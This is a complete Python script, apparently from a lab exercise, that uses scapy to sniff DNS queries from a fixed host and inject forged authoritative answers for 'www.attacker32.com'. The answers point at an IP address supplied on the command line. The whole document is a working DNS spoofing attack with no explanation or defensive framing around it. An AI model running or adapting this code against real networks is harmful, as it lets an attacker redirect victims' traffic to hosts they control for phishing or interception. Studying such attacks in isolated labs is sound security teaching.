#!/usr/bin/env python3
import sys
from scapy.all import *

def spoof_dns(pkt):
  if(DNS in pkt and 'www.attacker32.com' in pkt[DNS].qd.qname):
     IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)
     UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

     Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                    rdata=address, ttl=3)
     DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd,
                  aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=0,
                  an=Anssec)
     spoofpkt = IPpkt/UDPpkt/DNSpkt
     send(spoofpkt, verbose=False)
     print("Request: " + pkt[IP].src + " --> " + pkt[IP].dst
             + " ### Question: " + pkt[DNS].qd.qname)
     print("Spoof: " + spoofpkt[IP].src + " --> " + spoofpkt[IP].dst
             + " ### Answer: " + address)

if len(sys.argv) < 2:
   print ("Please provide an IP address")
   exit()
address = sys.argv[1]                                             
pkt=sniff(filter='udp and (src host 10.0.2.68 and dst port 53)', 
          prn=spoof_dns)
